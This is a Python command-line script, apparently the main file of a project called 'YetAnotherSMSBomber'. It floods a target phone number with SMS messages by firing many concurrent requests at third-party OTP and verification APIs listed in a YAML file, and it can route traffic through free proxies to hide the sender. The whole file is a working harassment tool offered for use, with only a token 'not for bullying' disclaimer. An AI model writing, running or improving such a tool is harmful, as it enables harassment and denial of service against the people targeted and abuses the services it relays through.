#!/usr/bin/env python3

# SPDX-License-Identifier: GPL-3.0-or-later

from concurrent.futures import ThreadPoolExecutor, as_completed
from utils import APIRequestsHandler, CustomArgumentParser
import requests
import random
import time

from yaml import load

try:
    from yaml import CLoader as Loader
except ImportError:
    from yaml import Loader

ascii_art = r"""

__   __     _        _               _    _
\ \ / /___ | |_     /_\   _ _   ___ | |_ | |_   ___  _ _
 \ V // -_)|  _|   / _ \ | ' \ / _ \|  _|| ' \ / -_)| '_|
  |_| \___| \__|  /_/ \_\|_||_|\___/ \__||_||_|\___||_|
 ___  __  __  ___    ___              _
/ __||  \/  |/ __|  | _ ) ___  _ __  | |__  ___  _ _
\__ \| |\/| |\__ \  | _ \/ _ \| '  \ | '_ \/ -_)| '_|
|___/|_|  |_||___/  |___/\___/|_|_|_||_.__/\___||_|

"""

parser = CustomArgumentParser(
    allow_abbrev=False,
    add_help=False,
    description="YetAnotherSMSBomber - A clean, small and powerful SMS bomber script.",
    epilog="Use this for fun, not for revenge or bullying!",
)
parser.add_argument(
    "target",
    metavar="TARGET",
    type=lambda x: (13 >= len(str(int(x))) >= 4)
    and int(x)
    or parser.error('"%s" is an invalid mobile number!' % int(x)),
    help="Target mobile number without country code.",
)
parser.add_argument(
    "--config-path",
    "-c",
    default="services.yaml",
    help="Path to API services file. (NOTE: the file must be in proper YAML format!)",
)
parser.add_argument(
    "--num", "-N", type=int, help="Number of SMSs to send to TARGET.", default=30
)
parser.add_argument(
    "--country",
    "-C",
    type=int,
    help="Country code without (+) sign.",
    default=91,
)
parser.add_argument(
    "--threads",
    "-T",
    type=int,
    help="Max number of concurrent HTTP(s) requests.",
    default=15,
)
parser.add_argument(
    "--timeout",
    "-t",
    type=int,
    help="Time (in seconds) to wait for an API request to complete.",
    default=10,
)
parser.add_argument(
    "--proxy",
    "-P",
    action="store_true",
    help="Use proxy for bombing. (Recommended for large number of SMSs)",
)
parser.add_argument(
    "--verbose",
    "-v",
    action="store_true",
    help="Enables verbose output, for debugging.",
)
parser.add_argument(
    "--verify",
    "-V",
    action="store_true",
    help="To verify all providers are working or not.",
)
parser.add_argument("-h", "--help", action="help", help="Display this message.")
args = parser.parse_args()

# config loading
config = args.config_path
target = str(args.target)
country_code = str(args.country)
no_of_threads = args.threads
no_of_sms = args.num
failed, success = 0, 0

print(ascii_art)
not args.verbose and not args.verify and print(
    f"Target: {target} | Threads: {no_of_threads} | SMS-Bombs: {no_of_sms}"
)


# proxy setup
def get_proxy():
    args.verbose and print("Fetching proxies from server.....")
    curl = requests.get("http://pubproxy.com/api/proxy?format=txt").text
    if "http://pubproxy.com/#premium" in curl:
        args.verbose and print(
            "Proxy limitation error, proceeding without a proxy now.."
        )
        return
    args.verbose and print(f"Using Proxy: {curl}")
    return {"http": curl, "https": curl}


proxies = get_proxy() if args.proxy else None

# threadsssss
start = time.time()
providers = (load(open(config, "r"), Loader=Loader))["providers"]
if args.verify:
    pall = [p for x in providers.values() for p in x]
    print(f"Processing {len(pall)} providers, please wait!\n")
    with ThreadPoolExecutor(max_workers=len(pall)) as executor:
        jobs = []
        for config in pall:
            jobs.append(
                executor.submit(
                    (
                        APIRequestsHandler(
                            target,
                            proxy=proxies,
                            verbose=args.verbose,
                            verify=True,
                            timeout=args.timeout,
                            cc=country_code,
                            config=config,
                        )
                    ).start
                ),
            )
        for job in as_completed(jobs):
            result = job.result()
            if result:
                success += 1
            else:
                failed += 1
else:
    while success < no_of_sms:
        with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
            jobs = []
            for i in range(no_of_sms - success):
                p = APIRequestsHandler(
                    target,
                    proxy=proxies,
                    verbose=args.verbose,
                    timeout=args.timeout,
                    cc=country_code,
                    config=random.choice(
                        providers[country_code] + providers["multi"]
                        if country_code in providers
                        else providers["multi"]
                    ),
                )
                jobs.append(executor.submit(p.start))
            for job in as_completed(jobs):
                result = job.result()
                if result:
                    success += 1
                else:
                    failed += 1
                not args.verbose and print(
                    f"Requests: {success+failed} | Success: {success} | Failed: {failed}",
                    end="\r",
                )
end = time.time()

# finalize
if args.verbose or args.verify:
    print(f"\nSuccess: {success} | Failed: {failed}")
else:
    print()
print(f"Took {end-start:.2f}s to complete")
